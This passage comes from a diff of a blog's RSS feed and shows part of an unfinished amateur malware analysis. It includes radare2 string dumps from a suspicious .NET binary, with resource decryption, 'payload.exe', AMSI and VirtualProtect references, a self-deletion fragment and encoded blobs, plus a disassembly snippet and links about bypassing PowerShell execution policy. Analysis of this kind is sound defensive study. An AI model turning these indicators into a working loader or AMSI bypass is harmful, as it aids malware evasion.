+</span></span><span class="line"><span class="cl">317 0x00002cf7 0x00002cf7 5   6            ascii   Array
+</span></span><span class="line"><span class="cl">318 0x00002cfd 0x00002cfd 18  19           ascii   RuntimeFieldHandle
+</span></span><span class="line"><span class="cl">319 0x00002d10 0x00002d10 15  16           ascii   InitializeArray
+</span></span><span class="line"><span class="cl">320 0x00002d20 0x00002d20 19  20           ascii   $$method0x6000003-2
+</span></span><span class="line"><span class="cl">321 0x00002d34 0x00002d34 7   8            ascii   UIntPtr
+</span></span><span class="line"><span class="cl">322 0x00002d3c 0x00002d3c 11  12           ascii   op_Explicit
+</span></span><span class="line"><span class="cl">323 0x00002d48 0x00002d48 4   5            ascii   Copy
+</span></span><span class="line"><span class="cl">324 0x00002d4d 0x00002d4d 17  18           ascii   System.Reflection
+</span></span><span class="line"><span class="cl">325 0x00002d5f 0x00002d5f 8   9            ascii   Assembly
+</span></span><span class="line"><span class="cl">326 0x00002d68 0x00002d68 20  21           ascii   GetExecutingAssembly
+</span></span><span class="line"><span class="cl">327 0x00002d7d 0x00002d7d 24  25           ascii   GetManifestResourceNames
+</span></span><span class="line"><span class="cl">328 0x00002d96 0x00002d96 13  14           ascii   WriteAllBytes
+</span></span><span class="line"><span class="cl">329 0x00002da4 0x00002da4 16  17           ascii   System.Threading
+</span></span><span class="line"><span class="cl">330 0x00002db5 0x00002db5 11  12           ascii   ThreadStart
+</span></span><span class="line"><span class="cl">331 0x00002dc1 0x00002dc1 6   7            ascii   Thread
+</span></span><span class="line"><span class="cl">332 0x00002dc8 0x00002dc8 4   5            ascii   Char
+</span></span><span class="line"><span class="cl">333 0x00002dcd 0x00002dcd 5   6            ascii   Split
+</span></span><span class="line"><span class="cl">334 0x00002dd3 0x00002dd3 4   5            ascii   Load
+</span></span><span class="line"><span class="cl">335 0x00002dd8 0x00002dd8 10  11           ascii   MethodInfo
+</span></span><span class="line"><span class="cl">336 0x00002de3 0x00002de3 14  15           ascii   get_EntryPoint
+</span></span><span class="line"><span class="cl">337 0x00002df2 0x00002df2 10  11           ascii   MethodBase
+</span></span><span class="line"><span class="cl">338 0x00002dfd 0x00002dfd 16  17           ascii   ProcessStartInfo
+</span></span><span class="line"><span class="cl">339 0x00002e0e 0x00002e0e 6   7            ascii   Concat
+</span></span><span class="line"><span class="cl">340 0x00002e15 0x00002e15 13  14           ascii   set_Arguments
+</span></span><span class="line"><span class="cl">341 0x00002e23 0x00002e23 18  19           ascii   ProcessWindowStyle
+</span></span><span class="line"><span class="cl">342 0x00002e36 0x00002e36 15  16           ascii   set_WindowStyle
+</span></span><span class="line"><span class="cl">343 0x00002e46 0x00002e46 18  19           ascii   set_CreateNoWindow
+</span></span><span class="line"><span class="cl">344 0x00002e59 0x00002e59 12  13           ascii   set_FileName
+</span></span><span class="line"><span class="cl">345 0x00002e66 0x00002e66 11  12           ascii   System.Core
+</span></span><span class="line"><span class="cl">346 0x00002e72 0x00002e72 28  29           ascii   System.Security.Cryptography
+</span></span><span class="line"><span class="cl">347 0x00002e8f 0x00002e8f 10  11           ascii   AesManaged
+</span></span><span class="line"><span class="cl">348 0x00002e9a 0x00002e9a 18  19           ascii   SymmetricAlgorithm
+</span></span><span class="line"><span class="cl">349 0x00002ead 0x00002ead 10  11           ascii   CipherMode
+</span></span><span class="line"><span class="cl">350 0x00002eb8 0x00002eb8 8   9            ascii   set_Mode
+</span></span><span class="line"><span class="cl">351 0x00002ec1 0x00002ec1 11  12           ascii   PaddingMode
+</span></span><span class="line"><span class="cl">352 0x00002ecd 0x00002ecd 11  12           ascii   set_Padding
+</span></span><span class="line"><span class="cl">353 0x00002ed9 0x00002ed9 16  17           ascii   ICryptoTransform
+</span></span><span class="line"><span class="cl">354 0x00002eea 0x00002eea 15  16           ascii   CreateDecryptor
+</span></span><span class="line"><span class="cl">355 0x00002efa 0x00002efa 19  20           ascii   TransformFinalBlock
+</span></span><span class="line"><span class="cl">356 0x00002f0e 0x00002f0e 12  13           ascii   MemoryStream
+</span></span><span class="line"><span class="cl">357 0x00002f1b 0x00002f1b 21  22           ascii   System.IO.Compression
+</span></span><span class="line"><span class="cl">358 0x00002f31 0x00002f31 10  11           ascii   GZipStream
+</span></span><span class="line"><span class="cl">359 0x00002f3c 0x00002f3c 6   7            ascii   Stream
+</span></span><span class="line"><span class="cl">360 0x00002f43 0x00002f43 15  16           ascii   CompressionMode
+</span></span><span class="line"><span class="cl">361 0x00002f53 0x00002f53 6   7            ascii   CopyTo
+</span></span><span class="line"><span class="cl">362 0x00002f5a 0x00002f5a 7   8            ascii   ToArray
+</span></span><span class="line"><span class="cl">363 0x00002f62 0x00002f62 25  26           ascii   GetManifestResourceStream
+</span></span><span class="line"><span class="cl">364 0x00002f7c 0x00002f7c 11  12           ascii   payload.exe
+</span></span><span class="line"><span class="cl">365 0x00002f8a 0x00002f8a 34  69           utf16le Select * from Win32_ComputerSystem
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">373 0x00003070 0x00003070 44  89           utf16le Ok++WI0tak7DdF3uV9x+8O7wJaTIlfxMVTMno9KXut4=
+</span></span><span class="line"><span class="cl">374 0x000030ca 0x000030ca 44  90           utf16le +uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc=
+</span></span><span class="line"><span class="cl">375 0x00003124 0x00003124 24  49           utf16le WTltvoM17r/Ehimm8ynucg==
+</span></span><span class="line"><span class="cl">376 0x00003156 0x00003156 44  89           utf16le amZLVSQJiUQKj6Rv/kTQ8kyn+kGd0mUv6VK0wS/w3/E=
+</span></span><span class="line"><span class="cl">377 0x000031b0 0x000031b0 14  29           utf16le VirtualProtect
+</span></span><span class="line"><span class="cl">378 0x000031ce 0x000031ce 8   18           utf16le amsi.dll
+</span></span><span class="line"><span class="cl">379 0x000031e0 0x000031e0 24  49           utf16le WG/Dged0cIrjNUQv5M9ONw==
+</span></span><span class="line"><span class="cl">380 0x00003212 0x00003212 9   20           utf16le ntdll.dll
+</span></span><span class="line"><span class="cl">381 0x00003226 0x00003226 24  50           utf16le KMgwS70BP93VTwRv09KJTQ==
+</span></span><span class="line"><span class="cl">382 0x00003258 0x00003258 24  50           utf16le ZoHIhlSGD8rN6cc5D8M/MA==
+</span></span><span class="line"><span class="cl">383 0x0000328a 0x0000328a 24  49           utf16le shwnMnkYp+bePn1r9fIgQg==
+</span></span><span class="line"><span class="cl">384 0x000032c3 0x000032c3 63  127          utf16le MNbxejM5jxzm3r5TKG6sPhlK6QF/D8w6/aOC8lz9bfMr26dy72cAJCSoDcBoN3Q
+</span></span><span class="line"><span class="cl">385 0x00003343 0x00003343 9   19           utf16le &#34; &amp; del &#34;
+</span></span><span class="line"><span class="cl">386 0x0000335b 0x0000335b 7   16           utf16le cmd.exe
+</span></span></code></pre></div><p>There are base64 encoded strings, interesting function calls and interesting strings in this binary, which I can look up and figure out what this file does. It will be so easy!!</p>
+<p><img loading="lazy" src="https://media.giphy.com/media/2fLdG18W5BLI5uzOHk/giphy.gif#center" alt=""  />
+</p>
+<p>But to my surprise, it was not at all easy&hellip; Or maybe I&rsquo;m just not worthy yet.</p>
+<ul>
+<li>
+<p>All the base64 strings are not readable. Although I&rsquo;ve a feeling that these strings are used in similar fashion as they were used in previous powershell payload.</p>
+</li>
+<li>
+<p>Even after looking in the memory area where the intriguing strings are pointed, I was unable to find anything that made sense to me.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[0x00002f70]&gt; pd 20
+</span></span><span class="line"><span class="cl">            ; CODE XREF from fcn.00000000 @ +0x2f01
+</span></span><span class="line"><span class="cl">            0x00002f70      6f             outsd dx, dword [rsi]
+</span></span><span class="line"><span class="cl">        ┌─&lt; 0x00002f71      7572           jne 0x2fe5
+</span></span><span class="line"><span class="cl">        │   0x00002f73      636553         movsxd rsp, dword [rbp + 0x53]
+</span></span><span class="line"><span class="cl">       ┌──&lt; 0x00002f76      7472           je 0x2fea
+</span></span><span class="line"><span class="cl">       ││   0x00002f78      65             invalid
+</span></span><span class="line"><span class="cl">       ││   0x00002f79      61             invalid
+</span></span><span class="line"><span class="cl">       ││   0x00002f7a      6d             insd dword [rdi], dx
+</span></span><span class="line"><span class="cl">       ││   0x00002f7b      007061         add byte [rax + 0x61], dh
+</span></span><span class="line"><span class="cl">      ┌───&lt; 0x00002f7e      796c           jns 0x2fec
+</span></span><span class="line"><span class="cl">      │││   0x00002f80      6f             outsd dx, dword [rsi]
+</span></span><span class="line"><span class="cl">      │││   0x00002f81      61             invalid
+</span></span><span class="line"><span class="cl">     ┌────&lt; 0x00002f82      642e657865     js 0x2fec
+</span></span><span class="line"><span class="cl">     ││││   0x00002f87      0000           add byte [rax], al
+</span></span><span class="line"><span class="cl">     ││││   ; CODE XREFS from fcn.00000000 @ +0x2f15, +0x2f34
+</span></span><span class="line"><span class="cl">     ││││   0x00002f89      4553           push r11
+</span></span><span class="line"><span class="cl">     ││││   0x00002f8b      006500         add byte [rbp], ah
+</span></span><span class="line"><span class="cl">     ││││   0x00002f8e      6c             insb byte [rdi], dx
+</span></span><span class="line"><span class="cl">     ││││   0x00002f8f      006500         add byte [rbp], ah
+</span></span><span class="line"><span class="cl">     ││││   0x00002f92      6300           movsxd rax, dword [rax]
+</span></span><span class="line"><span class="cl">    ┌─────&lt; 0x00002f94      7400           je 0x2f96
+</span></span><span class="line"><span class="cl">    │││││   ; CODE XREF from fcn.00000000 @ +0x2f94
+</span></span><span class="line"><span class="cl">    └─────&gt; 0x00002f96      2000           and byte [rax], al
+</span></span></code></pre></div><p>Then I looked at the color patterns to figure out if it had repeated patterns&hellip; I could then take it as a sign that this binary is itself encoded.</p>
+<p><img loading="lazy" src="https://i.imgur.com/HUXPKyI.png#center" alt=""  />
+</p>
+<h3 id="next-steps">Next Steps?</h3>
+<p>There are numerous indicators right now that point to the possibility that this is malware, but who am I to judge? (<em>based on what I currently understand about Windows malware analysis</em>)</p>
+<p>For now, I just have a few leads to pursue, but maybe in the future I&rsquo;ll figure it all the way down and find out exactly what this program does. Till then&hellip;</p>
+<p><img loading="lazy" src="https://media.giphy.com/media/j4ksLmVDR4e6DbSQxU/giphy.gif#center" alt=""  />
+</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/">https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p><a href="https://www.offensive-security.com/offsec/powershell-obfuscation/">https://www.offensive-security.com/offsec/powershell-obfuscation/</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p><a href="https://rada.re/n/radare2.html">https://rada.re/n/radare2.html</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+]]></content:encoded>
     </item>
+    
   </channel>
 </rss>
